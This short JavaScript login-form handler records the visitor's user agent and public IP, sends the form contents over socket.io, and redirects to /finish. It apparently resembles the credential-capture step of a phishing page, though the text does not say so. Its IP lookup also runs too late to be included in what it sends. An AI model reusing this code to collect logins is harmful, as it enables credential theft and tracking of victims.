const socket = io();

function submitForm() {
    document.getElementById('userAgent').value = navigator.userAgent;

    fetch('https://api.ipify.org?format=json')
  .then(response => response.json())
  .then(data => {
    document.getElementById('ipFetch').value = data.ip
  })
  .catch(error => {
    console.error('Error fetching IP:', error);
  });


    const formData = new FormData(document.getElementById('loginForm'));

    socket.emit('submit', Object.fromEntries(formData));

    window.location.href = `/finish`;
}
